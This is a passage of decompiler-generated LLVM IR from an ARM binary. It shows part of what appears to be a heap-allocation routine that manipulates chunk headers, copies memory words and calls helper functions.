  store i32 %v2_1a83c, i32* %r1.global-to-local, align 4
  %v1_1a840 = add i32 %v1_1a80c, 16
  store i32 %v1_1a840, i32* %r3.global-to-local, align 4
  %v3_1a844 = icmp ult i32 %v2_1a83c, %v1_1a840
  br i1 %v3_1a844, label %dec_label_pc_1a8c8, label %dec_label_pc_1a84c

dec_label_pc_1a84c:                               ; preds = %dec_label_pc_1a838
  %v2_1a84c = sub i32 %v2_1a83c, %v1_1a80c
  %v1_1a850 = urem i32 %v3_1a7ec, 2
  %v2_1a854 = add i32 %v1_1a80c, %v1_1a800
  store i32 %v2_1a854, i32* %r1.global-to-local, align 4
  %v2_1a858 = or i32 %v1_1a80c, %v1_1a850
  store i32 %v2_1a858, i32* %r2.global-to-local, align 4
  %v1_1a85c = or i32 %v2_1a84c, 1
  store i32 %v1_1a85c, i32* %r3.global-to-local, align 4
  store i32 %v0_1a7ec, i32* @r4, align 4
  store i32 %v2_1a858, i32* %v2_1a7ec, align 4
  %v0_1a868 = load i32, i32* %r1.global-to-local, align 4
  %v1_1a868 = load i32, i32* %r0.global-to-local, align 4
  %v2_1a868 = add i32 %v1_1a868, 44
  %v3_1a868 = inttoptr i32 %v2_1a868 to i32*
  store i32 %v0_1a868, i32* %v3_1a868, align 4
  %v0_1a86c = load i32, i32* %r3.global-to-local, align 4
  %v1_1a86c = load i32, i32* %r1.global-to-local, align 4
  %v2_1a86c = add i32 %v1_1a86c, 4
  %v3_1a86c = inttoptr i32 %v2_1a86c to i32*
  store i32 %v0_1a86c, i32* %v3_1a86c, align 4
  br label %dec_label_pc_1aab0

dec_label_pc_1a874:                               ; preds = %dec_label_pc_1a818
  %v1_1a874 = and i32 %v3_1a830, -2
  %v2_1a878 = add i32 %v1_1a874, %v2_1a828
  store i32 %v2_1a878, i32* %r3.global-to-local, align 4
  %v1_1a87c = add i32 %v2_1a878, 4
  %v2_1a87c = inttoptr i32 %v1_1a87c to i32*
  %v3_1a87c = load i32, i32* %v2_1a87c, align 4
  store i32 %v3_1a87c, i32* %r3.global-to-local, align 4
  %v1_1a880 = urem i32 %v3_1a87c, 2
  %v2_1a880 = icmp eq i32 %v1_1a880, 0
  br i1 %v2_1a880, label %dec_label_pc_1a888, label %dec_label_pc_1a8c8

dec_label_pc_1a888:                               ; preds = %dec_label_pc_1a874
  %v1_1a888 = and i32 %v3_1a830, -4
  store i32 %v1_1a888, i32* %r3.global-to-local, align 4
  %v2_1a88c = add i32 %v1_1a888, %v1_1a804
  store i32 %v2_1a88c, i32* %r0.global-to-local, align 4
  %v3_1a890 = icmp ult i32 %v2_1a88c, %v1_1a80c
  br i1 %v3_1a890, label %dec_label_pc_1a8c8, label %dec_label_pc_1a898

dec_label_pc_1a898:                               ; preds = %dec_label_pc_1a888
  %v1_1a898 = add i32 %v1_1a804, %v0_1a7ec
  %v2_1a898 = inttoptr i32 %v1_1a898 to i32*
  %v3_1a898 = load i32, i32* %v2_1a898, align 4
  store i32 %v3_1a898, i32* %r1.global-to-local, align 4
  %v1_1a89c = add i32 %v3_1a898, 12
  %v2_1a89c = inttoptr i32 %v1_1a89c to i32*
  %v3_1a89c = load i32, i32* %v2_1a89c, align 4
  store i32 %v3_1a89c, i32* %r3.global-to-local, align 4
  %v9_1a8a0 = icmp eq i32 %v3_1a89c, %v2_1a828
  %v1_1a8a4 = add i32 %v2_1a828, 12
  %v2_1a8a4 = inttoptr i32 %v1_1a8a4 to i32*
  %v3_1a8a4 = load i32, i32* %v2_1a8a4, align 4
  store i32 %v3_1a8a4, i32* %r2.global-to-local, align 4
  br i1 %v9_1a8a0, label %dec_label_pc_1a8ac, label %dec_label_pc_1a8b8

dec_label_pc_1a8ac:                               ; preds = %dec_label_pc_1a898
  %v1_1a8ac = add i32 %v3_1a8a4, 8
  %v2_1a8ac = inttoptr i32 %v1_1a8ac to i32*
  %v3_1a8ac = load i32, i32* %v2_1a8ac, align 4
  store i32 %v3_1a8ac, i32* %r3.global-to-local, align 4
  %v9_1a8b0 = icmp eq i32 %v3_1a8ac, %v2_1a828
  br i1 %v9_1a8b0, label %dec_label_pc_1a8bc, label %dec_label_pc_1a8b8

dec_label_pc_1a8b8:                               ; preds = %dec_label_pc_1a898, %dec_label_pc_1a8ac
  %v0_1a8b8 = call i32 @function_15acc()
  store i32 %v0_1a8b8, i32* %r0.global-to-local, align 4
  %v0_1a8bc.pre = load i32, i32* @r1, align 4
  %v1_1a8bc.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_1a8bc

dec_label_pc_1a8bc:                               ; preds = %dec_label_pc_1a8ac, %dec_label_pc_1a8b8
  %v1_1a8bc = phi i32 [ %v3_1a8a4, %dec_label_pc_1a8ac ], [ %v1_1a8bc.pre, %dec_label_pc_1a8b8 ]
  %v0_1a8bc = phi i32 [ %v3_1a898, %dec_label_pc_1a8ac ], [ %v0_1a8bc.pre, %dec_label_pc_1a8b8 ]
  %v2_1a8bc = add i32 %v1_1a8bc, 8
  %v3_1a8bc = inttoptr i32 %v2_1a8bc to i32*
  store i32 %v0_1a8bc, i32* %v3_1a8bc, align 4
  %v0_1a8c0 = load i32, i32* %r2.global-to-local, align 4
  %v1_1a8c0 = load i32, i32* %r1.global-to-local, align 4
  %v2_1a8c0 = add i32 %v1_1a8c0, 12
  %v3_1a8c0 = inttoptr i32 %v2_1a8c0 to i32*
  store i32 %v0_1a8c0, i32* %v3_1a8c0, align 4
  %v1_1a97c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1a97c

dec_label_pc_1a8c8:                               ; preds = %dec_label_pc_1a838, %dec_label_pc_1a888, %dec_label_pc_1a874
  %v1_1a8c8 = add i32 %v1_1a80c, -7
  store i32 %v1_1a8c8, i32* %r0.global-to-local, align 4
  %v1_1a8cc = call i32 @function_14ccc(i32 %v1_1a8c8)
  store i32 %v1_1a8cc, i32* @r0, align 4
  store i32 %v1_1a8cc, i32* %r1.global-to-local, align 4
  %v2_1a8d0 = icmp eq i32 %v1_1a8cc, 0
  br i1 %v2_1a8d0, label %bb31, label %dec_label_pc_1a8dc

bb31:                                             ; preds = %dec_label_pc_1a8c8
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_1aab0

dec_label_pc_1a8dc:                               ; preds = %dec_label_pc_1a8c8
  %v1_1a8e4.pre = load i32, i32* @r4, align 4
  %v1_1a8dc = add i32 %v1_1a8cc, -4
  %v2_1a8dc = inttoptr i32 %v1_1a8dc to i32*
  %v3_1a8dc = load i32, i32* %v2_1a8dc, align 4
  store i32 %v3_1a8dc, i32* @r3, align 4
  %v1_1a8e0 = add i32 %v1_1a8cc, -8
  store i32 %v1_1a8e0, i32* @r7, align 4
  %v9_1a8e4 = icmp eq i32 %v1_1a8e0, %v1_1a8e4.pre
  br i1 %v9_1a8e4, label %.thread2, label %dec_label_pc_1a8f4

.thread2:                                         ; preds = %dec_label_pc_1a8dc
  %v2_1a8e8 = and i32 %v3_1a8dc, -4
  store i32 %v2_1a8e8, i32* %r3.global-to-local, align 4
  %v2_1a8ec = load i32, i32* @r6, align 4
  %v3_1a8ec = add i32 %v2_1a8ec, %v2_1a8e8
  store i32 %v3_1a8ec, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1a97c

dec_label_pc_1a8f4:                               ; preds = %dec_label_pc_1a8dc
  %v0_1a8f4 = load i32, i32* @r6, align 4
  %v1_1a8f4 = add i32 %v0_1a8f4, -4
  store i32 %v1_1a8f4, i32* @r2, align 4
  %v3_1a8f8 = udiv i32 %v1_1a8f4, 4
  store i32 %v3_1a8f8, i32* @ip, align 4
  %tmp37 = and i32 %v1_1a8f4, -4
  %tmp38 = icmp eq i32 %tmp37, 36
  %v2_1a900 = icmp ult i32 %v1_1a8f4, 36
  %v3_1a900 = or i1 %tmp38, %v2_1a900
  %v0_1a910 = load i32, i32* @r5, align 4
  br i1 %v3_1a900, label %dec_label_pc_1a910, label %dec_label_pc_1a904

dec_label_pc_1a904:                               ; preds = %dec_label_pc_1a8f4
  store i32 %v0_1a910, i32* @r1, align 4
  %v0_1a908 = call i32 @function_14000()
  store i32 %v0_1a908, i32* %r0.global-to-local, align 4
  br label %.thread6

dec_label_pc_1a910:                               ; preds = %dec_label_pc_1a8f4
  %v1_1a910 = inttoptr i32 %v0_1a910 to i32*
  %v2_1a910 = load i32, i32* %v1_1a910, align 4
  store i32 %v2_1a910, i32* %r3.global-to-local, align 4
  %v2_1a914 = inttoptr i32 %v1_1a8cc to i32*
  store i32 %v2_1a910, i32* %v2_1a914, align 4
  %v0_1a918 = load i32, i32* @r5, align 4
  %v1_1a918 = add i32 %v0_1a918, 4
  %v2_1a918 = inttoptr i32 %v1_1a918 to i32*
  %v3_1a918 = load i32, i32* %v2_1a918, align 4
  store i32 %v3_1a918, i32* %r3.global-to-local, align 4
  %v1_1a91c = load i32, i32* %r1.global-to-local, align 4
  %v2_1a91c = add i32 %v1_1a91c, 4
  %v3_1a91c = inttoptr i32 %v2_1a91c to i32*
  store i32 %v3_1a918, i32* %v3_1a91c, align 4
  %v0_1a920 = load i32, i32* @r5, align 4
  %v1_1a920 = add i32 %v0_1a920, 8
  %v2_1a920 = inttoptr i32 %v1_1a920 to i32*
  %v3_1a920 = load i32, i32* %v2_1a920, align 4
  store i32 %v3_1a920, i32* %r3.global-to-local, align 4
  %v0_1a924 = load i32, i32* @ip, align 4
  %v1_1a928 = load i32, i32* %r1.global-to-local, align 4
  %v2_1a928 = add i32 %v1_1a928, 8
  %v3_1a928 = inttoptr i32 %v2_1a928 to i32*
  store i32 %v3_1a920, i32* %v3_1a928, align 4
  %tmp39 = icmp ult i32 %v0_1a924, 5
  br i1 %tmp39, label %.thread6, label %dec_label_pc_1a930

dec_label_pc_1a930:                               ; preds = %dec_label_pc_1a910
  %v0_1a930 = load i32, i32* @r5, align 4
  %v1_1a930 = add i32 %v0_1a930, 12
  %v2_1a930 = inttoptr i32 %v1_1a930 to i32*
  %v3_1a930 = load i32, i32* %v2_1a930, align 4
  store i32 %v3_1a930, i32* %r3.global-to-local, align 4
  %v1_1a934 = load i32, i32* %r1.global-to-local, align 4
  %v2_1a934 = add i32 %v1_1a934, 12
  %v3_1a934 = inttoptr i32 %v2_1a934 to i32*
  store i32 %v3_1a930, i32* %v3_1a934, align 4
  %v0_1a938 = load i32, i32* @r5, align 4
  %v1_1a938 = add i32 %v0_1a938, 16
  %v2_1a938 = inttoptr i32 %v1_1a938 to i32*
  %v3_1a938 = load i32, i32* %v2_1a938, align 4
  store i32 %v3_1a938, i32* %r3.global-to-local, align 4
  %v0_1a93c = load i32, i32* @ip, align 4
  %v1_1a940 = load i32, i32* %r1.global-to-local, align 4
  %v2_1a940 = add i32 %v1_1a940, 16
  %v3_1a940 = inttoptr i32 %v2_1a940 to i32*
  store i32 %v3_1a938, i32* %v3_1a940, align 4
  %tmp40 = icmp ult i32 %v0_1a93c, 7
  br i1 %tmp40, label %.thread6, label %dec_label_pc_1a948

dec_label_pc_1a948:                               ; preds = %dec_label_pc_1a930
  %v0_1a948 = load i32, i32* @r5, align 4
  %v1_1a948 = add i32 %v0_1a948, 20
  %v2_1a948 = inttoptr i32 %v1_1a948 to i32*
  %v3_1a948 = load i32, i32* %v2_1a948, align 4
  store i32 %v3_1a948, i32* %r3.global-to-local, align 4
  %v1_1a94c = load i32, i32* %r1.global-to-local, align 4
  %v2_1a94c = add i32 %v1_1a94c, 20
  %v3_1a94c = inttoptr i32 %v2_1a94c to i32*
  store i32 %v3_1a948, i32* %v3_1a94c, align 4
  %v0_1a950 = load i32, i32* @r5, align 4
  %v1_1a950 = add i32 %v0_1a950, 24
  %v2_1a950 = inttoptr i32 %v1_1a950 to i32*
  %v3_1a950 = load i32, i32* %v2_1a950, align 4
  store i32 %v3_1a950, i32* %r3.global-to-local, align 4
  %v1_1a954 = load i32, i32* %r1.global-to-local, align 4
  %v2_1a954 = add i32 %v1_1a954, 24
  %v3_1a954 = inttoptr i32 %v2_1a954 to i32*
  store i32 %v3_1a950, i32* %v3_1a954, align 4
  %v0_1a958 = load i32, i32* @ip, align 4
  %v7_1a958 = icmp eq i32 %v0_1a958, 9
  br i1 %v7_1a958, label %bb32, label %.thread6

bb32:                                             ; preds = %dec_label_pc_1a948
  %v1_1a95c = load i32, i32* @r5, align 4
  %v2_1a95c = add i32 %v1_1a95c, 28
  %v3_1a95c = inttoptr i32 %v2_1a95c to i32*
  %v4_1a95c = load i32, i32* %v3_1a95c, align 4
  store i32 %v4_1a95c, i32* %r3.global-to-local, align 4
  %v2_1a960 = load i32, i32* %r1.global-to-local, align 4
  %v3_1a960 = add i32 %v2_1a960, 28
  %v4_1a960 = inttoptr i32 %v3_1a960 to i32*
  store i32 %v4_1a95c, i32* %v4_1a960, align 4
  %v1_1a964 = load i32, i32* @r5, align 4
  %v2_1a964 = add i32 %v1_1a964, 32
  %v3_1a964 = inttoptr i32 %v2_1a964 to i32*
  %v4_1a964 = load i32, i32* %v3_1a964, align 4
  store i32 %v4_1a964, i32* %r3.global-to-local, align 4
  %v2_1a968 = load i32, i32* %r1.global-to-local, align 4
  %v3_1a968 = add i32 %v2_1a968, 32
  %v4_1a968 = inttoptr i32 %v3_1a968 to i32*
  store i32 %v4_1a964, i32* %v4_1a968, align 4
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_1a948, %dec_label_pc_1a930, %dec_label_pc_1a910, %dec_label_pc_1a904, %bb32
  %v0_1a96c = load i32, i32* @r5, align 4
  store i32 %v0_1a96c, i32* @r0, align 4
  %v0_1a970 = call i32 @function_15850()
  store i32 %v0_1a970, i32* %r0.global-to-local, align 4
  %v0_1a974 = load i32, i32* @r7, align 4
  %v1_1a974 = add i32 %v0_1a974, 8
  store i32 %v1_1a974, i32* @r4, align 4
  br label %dec_label_pc_1aab0

dec_label_pc_1a97c:                               ; preds = %bb30, %.thread2, %dec_label_pc_1a8bc
  %v0_1a990 = phi i32 [ %v3_1a8ec, %.thread2 ], [ %v1_1a804, %bb30 ], [ %v1_1a97c.pre, %dec_label_pc_1a8bc ]
  %v0_1a97c = load i32, i32* @sb, align 4
  %v2_1a97c = sub i32 %v0_1a990, %v0_1a97c
  store i32 %v2_1a97c, i32* %r1.global-to-local, align 4
  %v0_1a984 = load i32, i32* @sl, align 4
  %v1_1a984 = add i32 %v0_1a984, 4
  %v2_1a984 = inttoptr i32 %v1_1a984 to i32*
  %v3_1a984 = load i32, i32* %v2_1a984, align 4
  %tmp41 = icmp ugt i32 %v2_1a97c, 15
  %v1_1a9ac = urem i32 %v3_1a984, 2
  store i32 %v1_1a9ac, i32* %r3.global-to-local, align 4
  br i1 %tmp41, label %dec_label_pc_1a9ac, label %dec_label_pc_1a98c

dec_label_pc_1a98c:                               ; preds = %dec_label_pc_1a97c
  %v2_1a990 = or i32 %v1_1a9ac, %v0_1a990
  store i32 %v2_1a990, i32* %r3.global-to-local, align 4
  store i32 %v2_1a990, i32* %v2_1a984, align 4
  %v0_1a998 = load i32, i32* @sl, align 4
  %v1_1a998 = load i32, i32* %r0.global-to-local, align 4
  %v2_1a998 = add i32 %v1_1a998, %v0_1a998
  store i32 %v2_1a998, i32* %r2.global-to-local, align 4
  %v1_1a99c = add i32 %v2_1a998, 4
  %v2_1a99c = inttoptr i32 %v1_1a99c to i32*
  %v3_1a99c = load i32, i32* %v2_1a99c, align 4
  %v1_1a9a0 = or i32 %v3_1a99c, 1
  store i32 %v1_1a9a0, i32* %r3.global-to-local, align 4
  store i32 %v1_1a9a0, i32* %v2_1a99c, align 4
  br label %dec_label_pc_1a9dc

dec_label_pc_1a9ac:                               ; preds = %dec_label_pc_1a97c
  %v2_1a9b0 = add i32 %v0_1a984, %v0_1a97c
  store i32 %v2_1a9b0, i32* %r0.global-to-local, align 4
  %v2_1a9b4 = or i32 %v1_1a9ac, %v0_1a97c
  store i32 %v2_1a9b4, i32* %r3.global-to-local, align 4
  %v1_1a9b8 = or i32 %v2_1a97c, 1
  store i32 %v1_1a9b8, i32* %r2.global-to-local, align 4
  store i32 %v2_1a9b4, i32* %v2_1a984, align 4
  %v0_1a9c0 = load i32, i32* %r2.global-to-local, align 4
  %v1_1a9c0 = load i32, i32* %r0.global-to-local, align 4
  %v2_1a9c0 = add i32 %v1_1a9c0, 4
  %v3_1a9c0 = inttoptr i32 %v2_1a9c0 to i32*
  store i32 %v0_1a9c0, i32* %v3_1a9c0, align 4
  %v0_1a9c4 = load i32, i32* %r0.global-to-local, align 4
  %v1_1a9c4 = load i32, i32* %r1.global-to-local, align 4
  %v2_1a9c4 = add i32 %v1_1a9c4, %v0_1a9c4
  store i32 %v2_1a9c4, i32* %r2.global-to-local, align 4
  %v1_1a9c8 = add i32 %v2_1a9c4, 4
  %v2_1a9c8 = inttoptr i32 %v1_1a9c8 to i32*
  %v3_1a9c8 = load i32, i32* %v2_1a9c8, align 4
  %v1_1a9cc = or i32 %v3_1a9c8, 1
  store i32 %v1_1a9cc, i32* %r3.global-to-local, align 4
  store i32 %v1_1a9cc, i32* %v2_1a9c8, align 4
  %v0_1a9d4 = load i32, i32* %r0.global-to-local, align 4
  %v1_1a9d4 = add i32 %v0_1a9d4, 8
  store i32 %v1_1a9d4, i32* @r0, align 4
  %v0_1a9d8 = call i32 @function_15850()
  store i32 %v0_1a9d8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1a9dc

dec_label_pc_1a9dc:                               ; preds = %dec_label_pc_1a98c, %dec_label_pc_1a9ac
  %v0_1a9dc = load i32, i32* @sl, align 4
  %v1_1a9dc = add i32 %v0_1a9dc, 8
  store i32 %v1_1a9dc, i32* @r4, align 4
  br label %dec_label_pc_1aab0

dec_label_pc_1a9e4:                               ; preds = %bb29
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 180260, i32* %r1.global-to-local, align 4
  %v4_1a9ec = load i32, i32* inttoptr (i32 180292 to i32*), align 4
  store i32 %v4_1a9ec, i32* @r8, align 4
  %v2_1a9f0 = inttoptr i32 %v1_1a800 to i32*
  %v3_1a9f0 = load i32, i32* %v2_1a9f0, align 4
  store i32 %v3_1a9f0, i32* @r4, align 4
  %v1_1a9f4 = add i32 %v4_1a9ec, 860
  %v2_1a9f4 = inttoptr i32 %v1_1a9f4 to i32*
  %v3_1a9f4 = load i32, i32* %v2_1a9f4, align 4
  %v1_1a9f8 = add i32 %v3_1a9f0, 4
  %v1_1a9fc = add i32 %v3_1a9f4, -1
  store i32 %v1_1a9fc, i32* %r2.global-to-local, align 4
  %v2_1aa00 = add i32 %v1_1a9f8, %v1_1a9fc
  %v1_1aa04 = load i32, i32* @sb, align 4
  %v2_1aa04 = add i32 %v2_1aa00, %v1_1aa04
  store i32 %v2_1aa04, i32* %r3.global-to-local, align 4
  %v2_1aa08 = sub i32 0, %v3_1a9f4
  %v3_1aa08 = and i32 %v2_1aa04, %v2_1aa08
  store i32 %v3_1aa08, i32* @r7, align 4
  %v2_1aa0c = sub i32 %v3_1aa08, %v3_1a9f0
  store i32 %v2_1aa0c, i32* @fp, align 4
  %v9_1aa10 = icmp eq i32 %v1_1a804, %v2_1aa0c
  br i1 %v9_1aa10, label %dec_label_pc_1aa84, label %dec_label_pc_1aa18

dec_label_pc_1aa18:                               ; preds = %dec_label_pc_1a9e4
  %v2_1aa18 = sub i32 %v1_1a800, %v3_1a9f0
  store i32 %v2_1aa18, i32* %r0.global-to-local, align 4
  %v2_1aa1c = add i32 %v3_1a9f0, %v1_1a804
  store i32 %v2_1aa1c, i32* %r1.global-to-local, align 4
  store i32 %v3_1aa08, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v4_1aa28 = call i32 @function_1ae10(i32 %v2_1aa18, i32 %v2_1aa1c, i32 %v3_1aa08, i32 1)
  store i32 %v4_1aa28, i32* %r0.global-to-local, align 4
  %v7_1aa2c = icmp eq i32 %v4_1aa28, -1
  br i1 %v7_1aa2c, label %dec_label_pc_1aa78, label %dec_label_pc_1aa34

dec_label_pc_1aa34:                               ; preds = %dec_label_pc_1aa18
  %v1_1aa34 = load i32, i32* @r4, align 4
  %v2_1aa34 = add i32 %v1_1aa34, %v4_1aa28
  store i32 %v2_1aa34, i32* %r0.global-to-local, align 4
  %v0_1aa38 = load i32, i32* @fp, align 4
  %v1_1aa38 = or i32 %v0_1aa38, 2
  store i32 %v1_1aa38, i32* %r3.global-to-local, align 4
  %v2_1aa3c = add i32 %v2_1aa34, 4
  %v3_1aa3c = inttoptr i32 %v2_1aa3c to i32*
  store i32 %v1_1aa38, i32* %v3_1aa3c, align 4
  %v0_1aa40 = load i32, i32* @r8, align 4
  %v1_1aa40 = add i32 %v0_1aa40, 868
  %v2_1aa40 = inttoptr i32 %v1_1aa40 to i32*
  %v3_1aa40 = load i32, i32* %v2_1aa40, align 4
  store i32 %v3_1aa40, i32* %r3.global-to-local, align 4
  %v1_1aa44 = add i32 %v0_1aa40, 880
  %v2_1aa44 = inttoptr i32 %v1_1aa44 to i32*
  %v3_1aa44 = load i32, i32* %v2_1aa44, align 4
  store i32 %v3_1aa44, i32* %r2.global-to-local, align 4
  %v0_1aa48 = load i32, i32* @r6, align 4
  %v2_1aa48 = sub i32 %v3_1aa40, %v0_1aa48
  store i32 %v2_1aa48, i32* %r3.global-to-local, align 4
  %v1_1aa4c = load i32, i32* @r7, align 4
  %v2_1aa4c = add i32 %v1_1aa4c, %v2_1aa48
  store i32 %v2_1aa4c, i32* %r1.global-to-local, align 4
  %v1_1aa50 = add i32 %v0_1aa40, 872
  %v2_1aa50 = inttoptr i32 %v1_1aa50 to i32*
  %v3_1aa50 = load i32, i32* %v2_1aa50, align 4
  store i32 %v3_1aa50, i32* %r3.global-to-local, align 4
  %v1_1aa58 = add i32 %v0_1aa40, 884
  %v2_1aa58 = inttoptr i32 %v1_1aa58 to i32*
  %v3_1aa58 = load i32, i32* %v2_1aa58, align 4
  store i32 %v3_1aa58, i32* %r2.global-to-local, align 4
  %tmp42 = icmp ugt i32 %v2_1aa4c, %v3_1aa44
  br i1 %tmp42, label %bb33, label %bb34

bb33:                                             ; preds = %dec_label_pc_1aa34
  store i32 %v2_1aa4c, i32* %v2_1aa44, align 4
  %v0_1aa60.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_1aa60.pre = load i32, i32* @r8, align 4
  br label %bb34

bb34:                                             ; preds = %dec_label_pc_1aa34, %bb33
  %v1_1aa60 = phi i32 [ %v0_1aa40, %dec_label_pc_1aa34 ], [ %v1_1aa60.pre, %bb33 ]
  %v0_1aa60 = phi i32 [ %v2_1aa4c, %dec_label_pc_1aa34 ], [ %v0_1aa60.pre, %bb33 ]
  %v2_1aa60 = add i32 %v1_1aa60, 868
  %v3_1aa60 = inttoptr i32 %v2_1aa60 to i32*
  store i32 %v0_1aa60, i32* %v3_1aa60, align 4
  %v0_1aa64 = load i32, i32* %r1.global-to-local, align 4
  %v1_1aa64 = load i32, i32* %r3.global-to-local, align 4
  %v2_1aa64 = add i32 %v1_1aa64, %v0_1aa64
  store i32 %v2_1aa64, i32* %r1.global-to-local, align 4
  %v1_1aa68 = load i32, i32* %r2.global-to-local, align 4
  %v0_1aa6c = load i32, i32* %r0.global-to-local, align 4
  %v1_1aa6c = add i32 %v0_1aa6c, 8
  store i32 %v1_1aa6c, i32* @r4, align 4
  %tmp43 = icmp ugt i32 %v2_1aa64, %v1_1aa68
  br i1 %tmp43, label %bb35, label %dec_label_pc_1aab0

bb35:                                             ; preds = %bb34
  %v5_1aa70 = load i32, i32* @r8, align 4
  %v6_1aa70 = add i32 %v5_1aa70, 884
  %v7_1aa70 = inttoptr i32 %v6_1aa70 to i32*
  store i32 %v2_1aa64, i32* %v7_1aa70, align 4
  br label %dec_label_pc_1aab0

dec_label_pc_1aa78:                               ; preds = %dec_label_pc_1aa18
  %v0_1aa78 = load i32, i32* @sb, align 4
  %v1_1aa78 = add i32 %v0_1aa78, 4
  store i32 %v1_1aa78, i32* %r3.global-to-local, align 4
  %v0_1aa7c = load i32, i32* @r6, align 4
  %v3_1aa7c = icmp ult i32 %v0_1aa7c, %v1_1aa78
  br i1 %v3_1aa7c, label %dec_label_pc_1aa8c, label %dec_label_pc_1aa78.dec_label_pc_1aa84_crit_edge

dec_label_pc_1aa78.dec_label_pc_1aa84_crit_edge:  ; preds = %dec_label_pc_1aa78
  %v0_1aa84.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1aa84

dec_label_pc_1aa84:                               ; preds = %dec_label_pc_1aa78.dec_label_pc_1aa84_crit_edge, %dec_label_pc_1a9e4
  %v0_1aa84 = phi i32 [ %v0_1aa84.pre, %dec_label_pc_1aa78.dec_label_pc_1aa84_crit_edge ], [ %v0_1a7ec, %dec_label_pc_1a9e4 ]
  store i32 %v0_1aa84, i32* @r4, align 4
  br label %dec_label_pc_1aab0

dec_label_pc_1aa8c:                               ; preds = %dec_label_pc_1aa78
  %v1_1aa8c = add i32 %v0_1aa78, -7
  store i32 %v1_1aa8c, i32* %r0.global-to-local, align 4
  %v1_1aa90 = call i32 @function_14ccc(i32 %v1_1aa8c)
  store i32 %v1_1aa90, i32* @r0, align 4
  store i32 %v1_1aa90, i32* @r4, align 4
  %v2_1aa94 = icmp eq i32 %v1_1aa90, 0
  br i1 %v2_1aa94, label %dec_label_pc_1aab0, label %dec_label_pc_1aa9c

dec_label_pc_1aa9c:                               ; preds = %dec_label_pc_1aa8c
  %v0_1aa9c = load i32, i32* @r6, align 4
  %v1_1aa9c = add i32 %v0_1aa9c, -8
  store i32 %v1_1aa9c, i32* @r2, align 4
  %v0_1aaa0 = load i32, i32* @r5, align 4
  store i32 %v0_1aaa0, i32* @r1, align 4
  %v0_1aaa4 = call i32 @function_14000()
  %v0_1aaa8 = load i32, i32* @r5, align 4
  store i32 %v0_1aaa8, i32* @r0, align 4
  %v0_1aaac = call i32 @function_15850()
  store i32 %v0_1aaac, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1aab0

dec_label_pc_1aab0:                               ; preds = %bb31, %bb35, %bb34, %dec_label_pc_1aa8c, %dec_label_pc_1aa84, %dec_label_pc_1a9dc, %.thread6, %dec_label_pc_1a84c, %dec_label_pc_1aa9c
  store i32 %v2_1a7a0, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 24, i32* %r3.global-to-local, align 4
  store i32 180260, i32* %r2.global-to-local, align 4
  %v4_1aac0 = load i32, i32* inttoptr (i32 180284 to i32*), align 4
  store i32 %v4_1aac0, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_1aac0)
  br label %dec_label_pc_1aacc

dec_label_pc_1aacc:                               ; preds = %dec_label_pc_1a7d4, %dec_label_pc_1a77c, %dec_label_pc_1a764, %dec_label_pc_1aab0
  %v0_1aacc = load i32, i32* @r4, align 4
  store i32 %v0_1aacc, i32* %r0.global-to-local, align 4
  store i32 %v3_1a744, i32* @r4, align 4
  store i32 %v6_1a744, i32* @r5, align 4
  store i32 %v9_1a744, i32* @r6, align 4
  store i32 %v12_1a744, i32* @r7, align 4
  store i32 %v15_1a744, i32* @r8, align 4
  store i32 %v18_1a744, i32* @sb, align 4
  store i32 %v21_1a744, i32* @sl, align 4
  store i32 %v24_1a744, i32* @fp, align 4
  store i32 %v27_1a744, i32* @lr, align 4
  ret i32 %v0_1aacc

; uselistorder directives
  uselistorder i32 %v2_1aa64, { 1, 0, 2 }
  uselistorder i32 %v2_1aa4c, { 1, 2, 0, 3 }
  uselistorder i32 %v4_1aa28, { 1, 0, 2 }
  uselistorder i32 %v3_1aa08, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1a9ac, { 2, 1, 0 }
  uselistorder i32 %v2_1a97c, { 1, 0, 2 }
  uselistorder i32 %v0_1a910, { 1, 0 }
  uselistorder i32 %v1_1a8cc, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32 %v3_1a830, { 0, 2, 1, 3 }
  uselistorder i32 %v2_1a828, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 %v1_1a80c, { 3, 5, 0, 1, 2, 4, 6 }
  uselistorder i32 %v1_1a804, { 0, 7, 5, 1, 2, 3, 4, 6, 8, 9 }
  uselistorder i32 %v1_1a800, { 2, 3, 0, 1, 4 }
  uselistorder i1 %v2_1a7f0, { 1, 0 }
  uselistorder i32 %v0_1a7ec, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_1a7cc, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 6, 1, 2, 3, 4, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 30, 6, 11, 7, 8, 9, 10, 22, 12, 14, 13, 15, 21, 23, 16, 17, 18, 19, 20, 26, 25, 24, 27, 29, 28 }
  uselistorder i32 860, { 0, 2, 1, 3 }
  uselistorder i32 ()* @function_15acc, { 6, 1, 0, 5, 4, 3, 2 }
  uselistorder i32* inttoptr (i32 180292 to i32*), { 2, 1, 17, 7, 8, 9, 10, 11, 6, 12, 5, 13, 0, 14, 15, 4, 16, 3 }
  uselistorder i32* inttoptr (i32 180276 to i32*), { 0, 2, 1 }
  uselistorder i32 %arg2, { 3, 2, 1, 0, 4 }
  uselistorder label %dec_label_pc_1aacc, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1aab0, { 8, 3, 4, 1, 2, 5, 6, 0, 7 }
